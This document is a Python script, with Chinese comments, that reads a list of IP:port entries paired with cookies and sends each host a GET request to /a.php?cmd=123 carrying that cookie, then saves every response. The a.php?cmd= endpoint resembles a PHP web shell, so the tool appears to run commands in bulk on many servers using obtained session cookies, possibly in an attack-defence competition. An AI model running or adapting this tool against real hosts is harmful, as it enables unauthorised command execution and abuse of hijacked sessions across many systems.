import requests
import os
import re
from datetime import datetime
from urllib.parse import urlparse

# ========== 配置参数 ==========
# Cookie文件路径
COOKIE_FILE_PATH = 'cookie.txt'
# 默认请求路径和参数
DEFAULT_PATH = '/a.php'
DEFAULT_QUERY = 'cmd=123'
# 默认协议
DEFAULT_PROTOCOL = 'http'
# 超时设置 (秒)
TIMEOUT = 30
# 响应保存目录
RESPONSE_DIR = 'responses'
# 自定义请求头
CUSTOM_HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Accept': '*/*',
    'Connection': 'keep-alive'
}
# ========== 配置参数结束 ==========

def ensure_response_dir():
    """
    确保响应保存目录存在
    """
    if not os.path.exists(RESPONSE_DIR):
        os.makedirs(RESPONSE_DIR)
        print(f"[+] 创建响应保存目录: {RESPONSE_DIR}")

def parse_cookie_file(file_path):
    """
    解析cookie.txt文件，提取IP、端口和cookie信息
    
    参数:
        file_path: cookie文件路径
    
    返回值:
        list: [(ip, port, cookie_string)] 格式的列表
    """
    targets = []
    
    try:
        with open(file_path, 'r', encoding='utf-8') as f:
            lines = f.readlines()
            
            for line in lines:
                line = line.strip()
                # 跳过注释行和空行
                if not line or line.startswith('#'):
                    continue
                
                # 解析格式: IP:端口 | cookie
                if '|' in line:
                    left_part, right_part = line.split('|', 1)
                    ip_port = left_part.strip()
                    cookie_string = right_part.strip()
                    
                    # 跳过失败的记录
                    if "请求失败" in cookie_string or "无Cookie" in cookie_string:
                        print(f"[-] 跳过无效记录: {line}")
                        continue
                    
                    # 解析IP和端口
                    if ':' in ip_port:
                        try:
                            ip, port_str = ip_port.split(':', 1)
                            port = int(port_str)
                            targets.append((ip, port, cookie_string))
                            print(f"[+] 解析成功: IP={ip}, Port={port}, Cookie长度={len(cookie_string)}")
                        except ValueError:
                            print(f"[-] 无效的IP:端口格式: {ip_port}")
                            continue
                    else:
                        print(f"[-] 无效的格式，缺少端口: {ip_port}")
                        continue
                else:
                    print(f"[-] 无效的行格式: {line}")
            
        print(f"[+] 从 {file_path} 成功解析 {len(targets)} 个有效目标")
        return targets
        
    except FileNotFoundError:
        print(f"[-] 错误: 找不到文件 {file_path}")
        return []
    except Exception as e:
        print(f"[-] 解析cookie文件时出错: {str(e)}")
        return []

def build_url(ip, port, path=DEFAULT_PATH, query=DEFAULT_QUERY, protocol=DEFAULT_PROTOCOL):
    """
    构建完整的URL
    
    参数:
        ip: IP地址
        port: 端口
        path: 请求路径
        query: 查询参数
        protocol: 协议
    
    返回值:
        str: 完整的URL
    """
    if not path.startswith('/'):
        path = '/' + path
    
    if query:
        if not query.startswith('?'):
            query = '?' + query
    else:
        query = ''
    
    return f"{protocol}://{ip}:{port}{path}{query}"

def send_request_with_cookie(ip, port, cookie_string, path=DEFAULT_PATH, query=DEFAULT_QUERY):
    """
    使用cookie发送GET请求
    
    参数:
        ip: IP地址
        port: 端口
        cookie_string: Cookie字符串
        path: 请求路径
        query: 查询参数
    
    返回值:
        tuple: (success, response_content/error_msg)
    """
    # 构建URL
    url = build_url(ip, port, path, query)
    print(f"\n[+] 发送请求到: {url}")
    
    # 构建请求头，添加Cookie
    headers = CUSTOM_HEADERS.copy()
    headers['Cookie'] = cookie_string
    print(f"[+] 使用Cookie: {cookie_string}")
    
    try:
        # 发送GET请求
        response = requests.get(
            url,
            headers=headers,
            timeout=TIMEOUT,
            allow_redirects=False
        )
        
        # 输出响应状态码
        print(f"[+] 响应状态码: {response.status_code}")
        
        # 获取响应内容
        content = response.text
        print(f"[+] 响应内容长度: {len(content)} 字符")
        
        # 显示部分响应内容
        preview = content[:200] + ("..." if len(content) > 200 else "")
        print(f"[+] 响应内容预览: {preview}")
        
        return True, content
        
    except requests.exceptions.RequestException as e:
        error_msg = f"请求失败: {str(e)}"
        print(f"[-] {error_msg}")
        return False, error_msg
    except Exception as e:
        error_msg = f"未知错误: {str(e)}"
        print(f"[-] {error_msg}")
        return False, error_msg

def save_response_to_file(ip, port, content, is_error=False):
    """
    将响应内容保存到文件
    
    参数:
        ip: IP地址
        port: 端口
        content: 响应内容或错误信息
        is_error: 是否为错误信息
    
    返回值:
        str: 保存的文件路径
    """
    # 使用简化的文件名格式，不包含时间戳
    filename = f"{RESPONSE_DIR}/{ip}_{port}.txt"
    
    try:
        with open(filename, 'w', encoding='utf-8') as f:
            if is_error:
                f.write(f"# 错误信息 - {ip}:{port}\n")
                f.write(f"# 目标: {ip}:{port}\n\n")
            else:
                f.write(f"# 目标: {ip}:{port}\n")
                f.write(f"# URL: {build_url(ip, port)}\n\n")
            
            f.write(content)
        
        print(f"[+] 响应已保存到: {filename}")
        return filename
    except Exception as e:
        print(f"[-] 保存响应文件失败: {str(e)}")
        return None

def main():
    """
    主函数 - 从cookie.txt读取信息并发送请求
    """
    print("==== Cookie请求执行工具 ====\n")
    print("功能说明：")
    print("1. 从cookie.txt读取IP:端口和Cookie信息")
    print("2. 使用Cookie访问指定URL")
    print("3. 将响应内容保存到文本文件")
    print("4. 默认访问格式: http://IP:端口/a.php?cmd=123\n")
    
    # 确保响应保存目录存在
    ensure_response_dir()
    
    # 解析cookie文件
    targets = parse_cookie_file(COOKIE_FILE_PATH)
    
    if not targets:
        print("[-] 没有找到有效的目标，程序退出")
        return
    
    # 统计信息
    success_count = 0
    fail_count = 0
    saved_files = []
    
    print(f"[+] 开始执行请求...")
    print(f"[+] 目标总数: {len(targets)}")
    print("=" * 60)
    
    # 对每个目标执行请求
    for idx, (ip, port, cookie_string) in enumerate(targets, 1):
        print(f"\n[+] 处理目标 {idx}/{len(targets)}: {ip}:{port}")
        
        # 发送请求
        success, result = send_request_with_cookie(ip, port, cookie_string)
        
        # 保存到文件
        file_path = save_response_to_file(ip, port, result, not success)
        if file_path:
            saved_files.append(file_path)
        
        # 更新统计信息
        if success:
            success_count += 1
        else:
            fail_count += 1
        
        print("=" * 60)
    
    # 打印执行结果摘要
    print("\n==== 执行结果摘要 ====")
    print(f"总目标数: {len(targets)}")
    print(f"成功: {success_count}")
    print(f"失败: {fail_count}")
    print(f"保存文件数: {len(saved_files)}")
    print(f"响应保存目录: {RESPONSE_DIR}")
    
    # 列出保存的文件
    if saved_files:
        print("\n保存的文件列表:")
        for file in saved_files:
            print(f"  - {file}")


if __name__ == "__main__":
    main()
    
    # 配置说明：
    # 1. 修改DEFAULT_PATH以指定请求路径
    # 2. 修改DEFAULT_QUERY以指定查询参数
    # 3. 根据需要调整CUSTOM_HEADERS中的请求头信息
    # 4. RESPONSE_DIR目录将存储所有响应文件